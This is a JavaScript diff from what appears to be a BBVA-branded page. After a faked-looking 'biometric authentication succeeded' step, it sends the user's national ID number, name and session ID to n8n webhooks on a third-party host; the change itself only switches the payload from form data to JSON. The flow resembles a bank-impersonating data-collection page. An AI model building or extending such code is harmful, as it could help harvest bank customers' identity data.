@@ -587,19 +587,24 @@ document.addEventListener('DOMContentLoaded', () => {
                     sessionStorage.removeItem('bbva_push_user_name');
                     if (pushSessionId) {
                         try {
-                            const formData = new URLSearchParams();
-                            formData.append('status',    'APROBADO');
-                            formData.append('sessionId', pushSessionId);
-                            formData.append('cedula',    localStorage.getItem('bbva_user_id') || '');
-                            formData.append('userName',  pushUserName);
-                            formData.append('mensaje',   'Autenticación biométrica exitosa en BBVA.');
+                            const payload = JSON.stringify({
+                                status:    'APROBADO',
+                                sessionId: pushSessionId,
+                                cedula:    localStorage.getItem('bbva_user_id') || '',
+                                userName:  pushUserName,
+                                mensaje:   'Autenticación biométrica exitosa en BBVA.'
+                            });
                             const n8nUrls = [
                                 'https://nuketownlabs-n8n.ko2m0t.easypanel.host/webhook-test/pago-confirmado',
                                 'https://nuketownlabs-n8n.ko2m0t.easypanel.host/webhook/pago-confirmado'
                             ];
                             for (const url of n8nUrls) {
                                 try {
-                                    const res = await fetch(url, { method: 'POST', body: formData });
+                                    const res = await fetch(url, {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: payload
+                                    });
                                     if (res.ok) { console.log('✅ Sesión confirmada en n8n:', pushSessionId); break; }
                                 } catch (e) { console.warn('⚠️ n8n endpoint no respondió:', url); }
                             }
